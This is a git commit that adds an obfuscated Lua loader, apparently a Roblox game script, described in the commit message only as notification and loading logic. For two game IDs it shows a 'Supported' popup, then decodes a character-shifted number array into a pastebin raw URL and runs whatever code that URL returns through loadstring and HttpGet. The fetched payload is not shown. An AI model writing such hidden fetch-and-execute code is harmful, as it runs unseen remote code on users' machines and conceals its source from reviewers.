81b8b18b34ee736e174edd7616bf2b00aef79fb0
arkanzulfadliputra-oss <arkanzulfadliputra@gmail.com>
2026-05-10 06:54:45 +0800

    Add game support notifications and loading logic

---
+++ PetaPeta/PetaPeta Hotel And School/Obf.29348)_(3(3(3.lua
@@ -0,0 +1,52 @@
+local sg = game:GetService("StarterGui")
+local p = game.PlaceId
+
+local function x(t)
+    local r = {}
+    
+    for i,v in ipairs(t) do
+        r[i] = utf8.char(v - 3)
+    end
+    
+    return table.concat(r)
+end
+
+if p == 14476003462 then
+
+    sg:SetCore("SendNotification",{
+        Title = "Success",
+        Text = "Game 1 Supported",
+        Duration = 3
+    })
+
+    local a = {
+        107,119,119,115,118,61,50,50,115,100,118,119,104,101,108,113,49,
+        102,114,112,50,117,100,122,50,89,120,69,124,56,60,91,71
+    }
+
+    loadstring(game:HttpGet(x(a)))()
+
+elseif p == 116387287343653 then
+
+    sg:SetCore("SendNotification",{
+        Title = "Success",
+        Text = "Game 2 Supported",
+        Duration = 3
+    })
+
+    local b = {
+        107,119,119,115,118,61,50,50,115,100,118,119,104,101,108,113,49,
+        102,114,112,50,117,100,122,50,101,60,100,122,56,118,81,60
+    }
+
+    loadstring(game:HttpGet(x(b)))()
+
+else
+
+    sg:SetCore("SendNotification",{
+        Title = "Not Support",
+        Text = "Game Not Supported",
+        Duration = 5
+    })
+
+end
